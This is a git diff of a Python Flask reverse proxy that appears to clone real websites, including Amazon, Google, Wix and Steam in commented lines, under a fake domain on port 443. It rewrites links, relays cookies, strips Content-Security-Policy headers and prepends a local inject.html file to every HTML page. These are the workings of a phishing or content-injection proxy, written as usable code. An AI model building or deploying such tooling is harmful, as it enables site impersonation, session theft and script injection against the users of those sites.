@@ -12,8 +12,6 @@ app = Flask(__name__)
 
 def make_request(method, url, headers, post_data = None, retries = 3, use_proxy = True):
 	proxies = {'http': 'http://192.168.1.49:9000','https': 'http://192.168.1.49:9000'} if use_proxy else {}
-	if method not in ['GET', 'POST']:
-		raise Exception("unsupported method = " + method)
 	counter = 0
 	while counter < retries:
 		try:
@@ -25,23 +23,30 @@ def make_request(method, url, headers, post_data = None, retries = 3, use_proxy 
 				return requests.options(url, headers=headers, allow_redirects=False, verify=False, timeout=5, proxies=proxies)
 			elif method == "HEAD":
 				return requests.head(url, headers=headers, allow_redirects=False, verify=False, timeout=5, proxies=proxies)
+			else:
+				counter = retries
+				raise Exception("unsupported method = " + method)
 		except Exception as e:
 			print(">>>>>>>>>>>>>>> ERROR, repeating.... ERRURL = " + url + " | " + str(e), flush=True)
 			counter += 1
 			
 # TODO: sustritution must be more wise than this basic version
-def replace_domain(data, domain, fakeDomain):
-	#data = re.sub("\"(https\:\/\/.*)\"", "\"https://" + fakeDomain + "?_URL_=\g<1>\"", data)
+def substitute_domain(data, domainOrig, domainSubst):
 	beforeSym = "([^.-])"
-	if 'www.' in domain:
-		data = re.sub(beforeSym+domain.replace('www.', ''), "\g<1>"+fakeDomain, data)
+	if 'www.' in domainOrig:
+		data = re.sub(beforeSym+domainOrig.replace('www.', ''), "\g<1>"+domainSubst, data)
 	else:
-		data = re.sub(beforeSym+"www."+domain, "\g<1>"+fakeDomain, data)
-	data = re.sub(beforeSym+domain, "\g<1>"+fakeDomain, data)
+		data = re.sub(beforeSym+"www."+domainOrig, "\g<1>"+domainSubst, data)
+	data = re.sub(beforeSym+domainOrig, "\g<1>"+domainSubst, data)
 	return data
 
 @app.before_request
-def main(domain = "www.wix.com", path = "demone2/phone-and-tablet"):
+#def main(domain = "www.amazon.com", path = ""):
+def main(domain = "getmestuff.shop", path = ""):
+#def main(domain = "www.google.com", path = ""):
+#def main(domain = "www.wix.com", path = "demone2/phone-and-tablet"):
+#def main(domain = "www.wix.com", path = "demone2/barbershop"):
+#def main(domain = "store.steampowered.com", path = ""):
 
 	fakeDomain = "faker.loc"
 	baseUrl = "https://"+domain
@@ -58,9 +63,16 @@ def main(domain = "www.wix.com", path = "demone2/phone-and-tablet"):
 		if query:
 			url += "?" + query
 	# more relient to replace every time - just in case fake domain in url somehow
-	url = replace_domain(url, fakeDomain, domain)
+	url = substitute_domain(url, fakeDomain, domain)
 
-	# headers
+	# static content (images, css)
+	accept = request.headers['accept'].lower()
+	if accept and ('image' in accept or 'css' in accept) and 'text/html' not in accept:
+		responseFake = make_response()
+		responseFake.headers['Location'] = url
+		return responseFake, 302
+
+	# headers from client
 	headers = {}
 	for header in request.headers:
 		k, v = header
@@ -74,7 +86,7 @@ def main(domain = "www.wix.com", path = "demone2/phone-and-tablet"):
 		for cookie in response.cookies:
 			responseFake.set_cookie(cookie.name, cookie.value)
 		location = response.headers['Location']
-		replaced = replace_domain(location, domain, fakeDomain)
+		replaced = substitute_domain(location, domain, fakeDomain)
 		if replaced != location:
 			# if redirect within same domain, better use original path in URL instead of query appendix
 			responseFake.headers['Location'] = replaced
@@ -85,10 +97,11 @@ def main(domain = "www.wix.com", path = "demone2/phone-and-tablet"):
 	# data
 	data = response.content
 	rtype = response.headers['content-type'] if 'content-type' in response.headers else ""
-	print("Response Code = "+str(response.status_code)+"\n", flush=True)
 	if 'text' in rtype or 'application/javascript' in rtype:
 		data = data.decode("utf8")
-		data = replace_domain(data, domain, fakeDomain)
+		# TODO: think about links substitution
+		#data = re.sub(r'''(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’]))''', "https://" + fakeDomain + "?_URL_=\g<1>", data)
+		data = substitute_domain(data, domain, fakeDomain)
 		data = data.encode("utf8")
 	if 'text/html' in rtype and not ".js" in url:
 		wrapper = open("/root/Desktop/copier/inject.html").read() \
@@ -97,11 +110,11 @@ def main(domain = "www.wix.com", path = "demone2/phone-and-tablet"):
 		# first - wrapper, after - original content
 		data = wrapper + data.decode("utf8")
 
+	# headers to client
 	responseFake = make_response(data)
 	for header in response.headers:
-		if header.lower() not in ['content-length', 'content-encoding', 'content-security-policy', 'cross-origin-opener-policy', 'set-cookie']:
+		if header.lower() not in ['content-length', 'content-encoding', 'content-security-policy', 'cross-origin-opener-policy', 'set-cookie', 'access-control-allow-origin']:
 			responseFake.headers[header] = response.headers[header]
-	responseFake.headers['Access-Control-Allow-Origin'] = '*'
 
 	# cookies
 	for cookie in response.cookies:
@@ -110,3 +123,7 @@ def main(domain = "www.wix.com", path = "demone2/phone-and-tablet"):
 	return responseFake, response.status_code
 
 app.run(host='0.0.0.0', port=443, debug=False, ssl_context=('/root/Desktop/copier/cert.pem', '/root/Desktop/copier/key.pem'))
+
+# substitution experiments
+#text = '"https://ree.com" ; http://reeee.com ; https://yandex.ru ; "https%3A//yandex.ru"'
+#print(re.sub(r'''(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’]))''', "L=\g<1>", text))
